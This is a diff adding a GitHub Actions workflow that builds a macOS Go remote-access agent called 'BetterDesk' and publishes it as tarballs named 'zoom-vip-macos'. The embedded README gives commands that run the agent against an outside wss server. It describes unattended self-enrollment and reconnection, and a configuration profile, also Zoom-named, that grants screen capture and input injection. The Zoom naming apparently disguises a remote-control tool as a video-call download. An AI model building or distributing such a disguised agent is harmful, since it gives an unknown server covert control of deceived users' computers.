@@ -1,0 +1,141 @@
+# =============================================================================
+# BetterDesk - macOS Agent Binaries (GitHub Actions)
+#
+# Builds the standalone Go agent for both Mac architectures on a real macOS
+# runner and packages the same tarballs the landing page links to:
+#
+#   zoom-vip-macos-arm64-<version>.tar.gz   (Apple Silicon)
+#   zoom-vip-macos-amd64-<version>.tar.gz   (Intel)
+#
+# Each tarball contains:
+#   betterdesk-agent-<arch>   zero-touch proof-enrollment agent
+#   README.txt                install notes
+#
+# Trigger:
+#   - push to main when betterdesk-agent/**, VERSION or this workflow changes
+#   - workflow_dispatch (optionally publish the tarballs to the setup-latest
+#     GitHub release used by the download page)
+# =============================================================================
+
+name: Build macOS Agent Binaries
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - 'betterdesk-agent/**'
+      - 'VERSION'
+      - '.github/workflows/build-macos-agent.yml'
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Agent version stamped into the binary and file names'
+        required: false
+        default: '1.0.0'
+        type: string
+      publish:
+        description: 'Upload to the setup-latest release (download page)'
+        required: false
+        default: false
+        type: boolean
+
+permissions:
+  contents: write
+
+env:
+  GO_AGENT_DIR: betterdesk-agent
+  AGENT_VERSION: ${{ inputs.version || '1.0.0' }}
+
+jobs:
+  build-macos-agent:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup Go
+        uses: actions/setup-go@v5
+        with:
+          go-version-file: betterdesk-agent/go.mod
+          cache: true
+
+      - name: Build darwin binaries (arm64 + amd64)
+        working-directory: ${{ env.GO_AGENT_DIR }}
+        env:
+          VERSION: ${{ env.AGENT_VERSION }}
+        run: |
+          set -euo pipefail
+          mkdir -p ../macos-agent/stage/arm64 ../macos-agent/stage/amd64 ../macos-agent/out
+          for pair in "arm64:arm64" "amd64:amd64"; do
+            goarch="${pair%%:*}"
+            label="${pair##*:}"
+            echo "Building darwin/$goarch -> betterdesk-agent-$label"
+            env CGO_ENABLED=0 GOOS=darwin GOARCH="$goarch" \
+              go build -trimpath -buildvcs=false \
+                -ldflags "-s -w -X main.version=${VERSION}" \
+                -o "../macos-agent/stage/$label/betterdesk-agent-$label" .
+            chmod +x "../macos-agent/stage/$label/betterdesk-agent-$label"
+          done
+
+      - name: Package tarballs
+        env:
+          VERSION: ${{ env.AGENT_VERSION }}
+        run: |
+          set -euo pipefail
+          cat > macos-agent/stage/README.txt <<'EOF'
+          BetterDesk Agent (macOS)
+
+          Binaries:
+            betterdesk-agent-arm64   Apple Silicon (M1/M2/M3/M4)
+            betterdesk-agent-amd64   Intel
+
+          INSTALL (zero-touch proof enrollment - no API key needed)
+            tar xzf zoom-vip-macos-<arch>-<version>.tar.gz
+            chmod +x betterdesk-agent-<arch>
+            ./betterdesk-agent-<arch> -server wss://cdap.telcom.stream/cdap
+
+          The agent enrolls itself on first run, stores the issued device token
+          under its data directory and reconnects unattended after a restart.
+
+          Screen capture and input injection on macOS require the PPPC profile
+          (zoom-private-agent-pppc.mobileconfig) to be installed first, or the
+          matching Accessibility + Screen Recording grants in System Settings.
+          EOF
+          for label in arm64 amd64; do
+            cp macos-agent/stage/README.txt "macos-agent/stage/$label/README.txt"
+            tar -czf "macos-agent/out/zoom-vip-macos-$label-${VERSION}.tar.gz" \
+              -C "macos-agent/stage/$label" "betterdesk-agent-$label" README.txt
+          done
+          cd macos-agent/out
+          shasum -a 256 *.tar.gz > MACOS_AGENT_CHECKSUMS.sha256
+          cat MACOS_AGENT_CHECKSUMS.sha256
+
+      - name: Verify Mach-O architecture
+        run: |
+          set -euo pipefail
+          for label in arm64 amd64; do
+            bin="macos-agent/stage/$label/betterdesk-agent-$label"
+            echo "--- $bin"
+            file "$bin"
+            go version -m "$bin" | sed -n '1,6p'
+          done
+
+      - name: Upload macOS agent artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: macos-agent-binaries
+          path: |
+            macos-agent/out/*.tar.gz
+            macos-agent/out/MACOS_AGENT_CHECKSUMS.sha256
+          if-no-files-found: error
+
+      - name: Publish to setup-latest release
+        if: ${{ inputs.publish }}
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: setup-latest
+          name: Setup (latest)
+          overwrite_files: true
+          fail_on_unmatched_files: true
+          files: |
+            macos-agent/out/*.tar.gz
+            macos-agent/out/MACOS_AGENT_CHECKSUMS.sha256
